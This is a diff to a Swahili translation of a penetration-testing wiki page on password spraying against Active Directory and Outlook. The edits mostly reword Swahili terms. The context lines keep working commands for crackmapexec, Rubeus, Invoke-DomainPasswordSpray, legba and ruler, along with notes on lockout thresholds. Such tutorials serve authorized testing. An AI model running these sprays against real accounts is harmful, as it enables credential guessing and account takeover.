@@ -5,16 +5,16 @@
 
 ## **Password Spraying**
 
-Mara tu unapopata **majina halali ya watumiaji** kadhaa unaweza kujaribu **nenosiri za kawaida** zaidi (zingatia sera ya nenosiri ya mazingira) na kila mmoja wa watumiaji ulioyagundua.\
-Kwa **default** urefu wa **minimum** wa **nenosiri** ni **7**.
+Mara tu unapopata **majina halali ya watumiaji** kadhaa unaweza kujaribu **nywila za kawaida** zaidi (zingatia sera ya nywila ya mazingira) na kila mmoja wa watumiaji ulioyagundua.\
+Kwa **kawaida** **urefu** wa **nywila** **wa chini** ni **7**.
 
 Orodha za majina ya kawaida ya watumiaji zinaweza pia kuwa na manufaa: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-Kumbuka kwamba **unaweza kufunga akaunti zingine ikiwa utajaribu nenosiri kadhaa zisizo sahihi** (kwa default zaidi ya 10).
+Kumbuka kwamba **unaweza kufunga akaunti zingine ikiwa utajaribu nywila kadhaa zisizo sahihi** (kwa kawaida zaidi ya 10).
 
-### Pata sera ya nenosiri
+### Pata sera ya nywila
 
-Ikiwa una baadhi ya akidi za mtumiaji au shell kama mtumiaji wa kikoa unaweza **pata sera ya nenosiri kwa**:
+Ikiwa una baadhi ya akidi za mtumiaji au shell kama mtumiaji wa kikoa unaweza **kupata sera ya nywila kwa**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -77,15 +77,15 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-- Kwa [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Inaweza kuunda watumiaji kutoka kwenye kikoa kwa default na itapata sera ya nywila kutoka kwenye kikoa na kupunguza majaribio kulingana na hiyo):
+- Pamoja na [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Inaweza kuunda watumiaji kutoka kwenye kikoa kwa default na itapata sera ya nywila kutoka kwenye kikoa na kupunguza majaribio kulingana na hiyo):
 ```powershell
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
-- Pamoja na [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
+- Na [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
 ```
 Invoke-SprayEmptyPassword
 ```
-## Ukatili wa Nguvu
+## Nguvu Mbaya
 ```bash
 legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
 ```
@@ -99,7 +99,7 @@ Kuna zana nyingi za p**assword spraying outlook**.
 - Na [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
 - Na [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
-Ili kutumia yoyote ya zana hizi, unahitaji orodha ya watumiaji na nenosiri / orodha ndogo ya nenosiri za kutumia.
+Ili kutumia yoyote ya zana hizi, unahitaji orodha ya watumiaji na nenosiri / orodha ndogo ya nenosiri za kupuliza.
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
